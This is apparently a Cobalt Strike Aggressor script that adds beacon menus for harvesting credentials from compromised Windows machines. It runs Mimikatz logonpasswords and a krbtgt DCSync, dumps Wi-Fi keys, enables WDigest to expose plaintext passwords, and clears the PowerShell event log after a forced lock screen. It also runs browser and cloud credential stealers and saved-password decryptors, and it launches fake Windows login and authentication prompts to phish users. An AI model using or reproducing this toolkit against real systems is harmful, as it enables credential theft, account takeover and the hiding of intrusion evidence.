menu "Read password" {
  item "logonpasswords" {
    $bid = $1['@'];
    bmimikatz($bid, "sekurlsa::logonpasswords");
  }
  item "Krbtgt hash" {
    $bid = $1['@'];
    $dialog = dialog("Krbtgt NTLM-Hash" , %(domain => "xxx.com" , user => "krbtgt", bid => $bid), &krbtgt);
    dialog_description($dialog, "Use Mimikatz to read the NTLM-Hash of the Krbtgt account.");
    drow_text($dialog, "domain", "Domain: ");
    drow_text($dialog, "user", "User: ");
    dbutton_action($dialog, "Run");
    dialog_show($dialog);
  }
  sub krbtgt{
    $domain = $3['domain'];
    $user = $3['user'];
    bmimikatz($bid, "lsadump::dcsync /domain:$domain /user:$user");
  }

  menu "Detect wifi password" {
    item "Get connected wifi" {
      local('$bid');
      foreach $bid ($1){
      bshell($1, "netsh wlan show profiles");
    }
  }
  item "Get wifi password" {
    prompt_text("Enter wifi name: ", "", lambda({
      bshell(@ids, "netsh wlan show profile name=\"$1\" key=clear");
    }, @ids => $1));
  }
  item "SharpWifiGrabber (retrieve Wi-Fi password)"
    {
      blog($1, "Project address: https://github.com/r3nhat/SharpWifiGrabber")
      bexecute_assembly($1, script_resource('/scripts/Grab password/SharpWifiGrabber.exe'), "");
    }
  }

  menu "Modify registry dump plain text password" {
    item "Show plain text" {
      local('$bid');
      foreach $bid ($1){
      bshell($1, "reg add HKLM\\SYSTEM\\CurrentControlSet\\Control\\SecurityProviders\\WDigest /v UseLogonCredential /t REG_DWORD /d 1 /f");
    }
  }
  item "Force lock screen" {
    local('$bid');
    foreach $bid ($1){
      blog($1, "Lock screen is being executed");
      bpowershell_import($bid, script_resource("/scripts/Grab password/lock-screen.ps1"));
      bpowerpick($bid,"Lock-WorkStation");
      bshell($bid,"wevtutil cl \"Windows PowerShell\"");
    }
  }
  item "Hide plain text" {
    local('$bid');
    foreach $bid ($1){
      bshell($1, "reg add HKLM\\SYSTEM\\CurrentControlSet\\Control\\SecurityProviders\\WDigest /v UseLogonCredential /t REG_DWORD /d 0 /f");
    }
  }
}

menu "Extract browser data and passwords" {
  item "BrowserGhost (extract browser passwords)" {
    blog($1, "Project address: https://github.com/QAX-A-Team/BrowserGhost")
    bexecute_assembly($1, script_resource("/scripts/Grab password/BrowserGhost.exe"));
  }

  item "SharpChromium (extract browser data)" {
    $bid = $1['@'];
    $dialog = dialog("SharpChromium", %(bid => $bid), &SharpChromium);
    dialog_description($dialog,".NET 4.0 CLR project for retrieving Chromium data such as cookies, history, and saved logins. Project address: https://github.com/djhohnstein/SharpChromium"); drow_combobox($dialog, "Type", "all/cookies/history/logins", @("all", "cookies","history","logins")); dbutton_action($dialog, "Run"); dialog_show($dialog); } sub SharpChromium { bexecute_assembly($bid, script_resource("/scripts/Grab password/SharpChromium.exe"), $3['Type']); } } menu "hack-browser-data" { item "Upload hack-browser-data" { $bid = $1; $dialog = dialog("Upload hack-browser-data", %(UploadPath => "C:\\Users\\Public\\", bid => $bid), &hack-browser-data); dialog_description($dialog, "All platforms supported, software address: https://github.com/moonD4rk/HackBrowserData");
    drow_text($dialog, "UploadPath", "Upload path: ");
    dbutton_action($dialog, "Upload");
    dialog_show($dialog);
  }
  sub hack-browser-data {
    bcd($bid, $3['UploadPath']);
    bupload($bid, script_resource("/scripts/Grab password/hack-browser-data.exe"));
  }

  item "Run hack-browser-data"{
    $bid = $1['@'];
    $Dialog = dialog("Run hack-browser-data",%(bid => $bid),&hack-browser-data_run);
    dialog_description($Dialog, "After running, a results folder will be generated in the current directory, and all results are in it");
    dbutton_action($Dialog, "Run");
    btask($bid, "After running, a results folder will be generated in the current directory, and all the results are in it", "");
    dialog_show($Dialog);
  }
  sub hack-browser-data_run{
    bshell($bid, "hack-browser-data.exe");
  }

  item "Delete hack-browser-data"{
    local('$bid');
    foreach $bid ($1){
      bshell($1, "del /f /s /q hack-browser-data.exe");
    }
  }
}

menu "Local program file password decryption" {
  item "SharpCloud (Get cloud credentials)" {
    $bid = $1['@'];
    $dialog = dialog("Get cloud credentials", %(bid => $bid), &SharpCloud);
    dialog_description($dialog, "Used to check whether there are credential files related to AWS, Microsoft Azure and Google Compute. Project address: https://github.com/chrismaddalena/SharpCloud"); drow_combobox($dialog, "type", "type:", @("all","aws","azure","gcloud")); dbutton_action($dialog, "Run"); dialog_show($dialog); } sub SharpCloud { $arg = join(' ', @($3['type'])); bexecute_assembly($bid, script_resource("/scripts/Grab password/SharpCloud.exe"), $arg); } menu "SharpDecryptPwd(from uknowsec)" { item "SharpDecryptPwd" { $bid = $1['@']; $dialog = dialog("SharpDecryptPwd", %(type => "-NavicatCrypto",bid => $bid), &SharpDecryptPwd); dialog_description($dialog,"Parse some programs whose passwords have been saved on the Windwos system, including: Navicat, TeamViewer, FileZilla, WinSCP, Xmangager series products (Xshell, Xftp). Project address: https://github.com/uknowsec/SharpDecryptPwd");
    drow_combobox($dialog, "type", "Type:", @("-NavicatCrypto", "-TeamViewer", "-FileZilla","-WinSCP"));
    dbutton_action($dialog, "Run");
    dialog_show($dialog);
  }
  item "Xmanager" {
    $bid = $1['@'];
    $dialog = dialog("Xmangager", %(type => "-Xmangager",path => "D:\\xshell\\Xshell\\Sessions",bid => $bid), &Xmangager);
    dialog_description($dialog, "Xmanager series products, such as：Xshell,Xftp。");
    drow_combobox($dialog, "type", "Type:", @("-Xmangager"));
    drow_text($dialog, "path", "Sessions Path:  ");
    dbutton_action($dialog, "Run");
    dialog_show($dialog);
  }
}
  sub SharpDecryptPwd {
    bexecute_assembly($bid, script_resource("/scripts/Grab password/SharpDecryptPwd.exe"), $3['type']);
  }
  sub Xmangager {
    $arg = join(' ', @($3['type'],"-p",$3['path']));
    bexecute_assembly($bid, script_resource("/scripts/Grab password/SharpDecryptPwd.exe"), $arg);
  }

  menu "SharpDecryptPwd(from RcoIl)" {
    item "SharpDecryptPwd40" {
      $bid = $1['@'];
      $dialog = dialog("SharpDecryptPwd40", %(type => "-Navicat",bid => $bid), &SharpDecryptPwd40);
      dialog_description($dialog,"Currently supports Navicat series, Xmanager series, TeamViewer, FileZilla client, Foxmail, RealVNC server, TortoiseSVN, WinSCP, Chrome full version. Project address: https://github.com/RcoIl/SharpDecryptPwd");
      drow_combobox($dialog, "type", "Type:", @("-Navicat", "-TeamViewer", "-FileZilla","-WinSCP","-Foxmail","-RealVNC","-TortoiseSVN","-Chrome"));
      dbutton_action($dialog, "Run");
      dialog_show($dialog);
    }
    item "Xmangager40" {
      $bid = $1['@'];
      $dialog = dialog("Xmangager", %(type => "-Xmanager",path => "D:\\xshell\\Xshell\\Sessions",bid => $bid), &Xmangager40);
      dialog_description($dialog, "Xmangager series products, such as：Xshell,Xftp");
      drow_combobox($dialog, "type", "Type:", @("-Xmanager"));
      drow_text($dialog, "path", "Sessions Path:  ");
      dbutton_action($dialog, "Run");
      dialog_show($dialog);
    }
  }
  sub SharpDecryptPwd40 {
    bexecute_assembly($bid, script_resource("/scripts/Grab password/SharpDecryptPwd40.exe"), $3['type']);
  }
  sub Xmangager40 {
    $arg = join(' ', @($3['type'],"-p",$3['path']));
    bexecute_assembly($bid, script_resource("/scripts/Grab password/SharpDecryptPwd40.exe"), $arg);
  }
}

  item "Net-GPPPassword (Group Policy Account Credentials)" {
    blog($1, ".NET implementation of Get-GPPPassword. Retrieve plaintext passwords and other information for accounts pushed through Group Policy Preferences. This technique is old, but still useful in environments where domains were created a long time ago. Project address: https://github.com/outflanknl/Net-GPPPassword")
    bexecute_assembly($1, script_resource("/scripts/Grab password/Net-GPPPassword_dotNET_v2.exe"), "");
  }

  menu "Phishing password stealing" {
    item "FakeLogonScreen (windows lock screen phishing)" {
      $bid = $1;
      $dialog = dialog("FakeLogonScreen", %(bid => $bid), &FakeLogonScreen);
      dialog_description($dialog, "FakeLogonScreen is a utility for faking the Windows login screen to obtain the user's password. The entered password is verified against Active Directory or the local computer to ensure that the password is correct, and the output is written to the console and the %LOCALAPPDATA%\\Microsoft\\user.db file. Because the fake page is hard to describe, use it with caution!!! Project address: https://github.com/bitsadmin/fakelogonscreen");
      dbutton_action($dialog, "Run");
      dialog_show($dialog);
    }
    sub FakeLogonScreen {
      bexecute_assembly($bid, script_resource("/scripts/Grab password/FakeLogonScreenToFile.exe"), "");
    }

    item "CredPhisher (Authentication Login Box Phishing)" {
      $bid = $1['@'];
      $dialog = dialog("CredPhisher", %(content => "Security Authentication", bid => $bid), &CredPhisher);
      dialog_description($dialog, "Pop up the security authentication login box for phishing. Windows 10 test successful. Project address: https://github.com/matterpreter/OffensiveCSharp/tree/master/CredPhisher");
      drow_text($dialog, "content", "content:");
      dbutton_action($dialog, "Run");
      dialog_show($dialog);
    }
    sub CredPhisher {
      $arg = join('',@("",$3['content']));
      bexecute_assembly($bid, script_resource("/scripts/Grab password/CredPhisher.exe"), $arg);
    }
  }


}